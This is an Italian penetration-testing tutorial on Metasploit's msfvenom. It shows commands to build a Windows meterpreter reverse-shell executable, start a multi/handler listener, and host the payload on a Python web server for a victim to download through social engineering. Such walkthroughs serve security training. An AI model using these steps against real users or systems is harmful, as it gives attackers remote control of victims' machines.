
# Msfvenom

Un **attacco client-side** è un attacco in cui si induce un client (cioè l'utente) ad eseguire un payload dannoso sul proprio sistema. Questo permette all’attaccante di ottenere l’accesso remoto al dispositivo della vittima. Questi attacchi si basano spesso su **tecniche di ingegneria sociale**, come l’invio di documenti infetti, link contraffatti, file eseguibili mascherati o PEs.

I **PE (Portable Executable)** sono file binari tipici dei sistemi Windows, con estensione `.exe` o `.dll`, che contengono codice eseguibile. Vengono spesso utilizzati per veicolare payload all’interno di attacchi client-side, poiché Windows li esegue direttamente se attivati dall’utente.

A differenza degli attacchi client-side, gli **attacchi server-side** mirano a sfruttare vulnerabilità direttamente su un servizio esposto da un server (come Apache, MySQL, SMB, ecc.), senza bisogno del coinvolgimento dell'utente.

In questo contesto si inserisce **Msfvenom**, uno strumento da riga di comando integrato in Metasploit Framework che consente di generare, personalizzare e codificare payload dannosi per diverse piattaforme. Msfvenom nasce dalla fusione di due utility precedenti:

- `msfpayload` → serviva a generare il payload.
- `msfencode` → serviva a codificare il payload per evitarne il rilevamento.

Oggi entrambe sono state rimpiazzate da `msfvenom`.

---

## Documentazione e Payload Disponibili

Per visualizzare la documentazione:
```bash
msfvenom
```

Per elencare tutti i payload disponibili:
```bash
msfvenom --list payloads
```

---

## Stage e No-Stage Payload

I **stage payload** sono payload modulari suddivisi in due fasi: un piccolo "stager" viene eseguito inizialmente e poi scarica il resto del payload. Questo permette di ridurre la dimensione iniziale e aumentare la flessibilità.

I **no-stage payload** invece sono monolitici: tutto il codice è contenuto in un unico eseguibile, e non richiedono un secondo stadio.

**Esempio di stage payload:**
- `windows/meterpreter/reverse_tcp`

**Esempio di no-stage payload:**
- `windows/shell_reverse_tcp`

---

## Generazione di un Payload

Per generare un payload, bisogna specificare:
- L’architettura (`-a`) – es. `x86` o `x64`
- Il payload (`-p`)
- L’IP e la porta dell’attaccante (`LHOST`, `LPORT`)
- Il formato (`-f`)

Esempio:
```bash
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > /tmp/payload.exe
```

Per visualizzare tutti i formati supportati:
```bash
msfvenom --list formats
```

---

## Attivazione del Listener

Per ricevere la connessione reverse del payload, è necessario configurare un **listener** in Metasploit:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP_attaccante>
set LPORT <PORT>
run
```

> Il payload usato nel `multi/handler` **deve combaciare esattamente** con quello specificato in fase di generazione con `msfvenom`. In caso contrario, la sessione non verrà interpretata correttamente.

---

## Hosting del Payload

Per consegnare il file alla vittima, si può usare un server HTTP semplice:
```bash
sudo python3 -m http.server 80
```

Poi, basterà fornire alla vittima un link del tipo:
```
http://<IP_attaccante>/payload.exe
```

In ambienti di test, questo approccio consente di simulare efficacemente un attacco client-side, sfruttando la disattenzione o la mancanza di competenze della vittima.

---
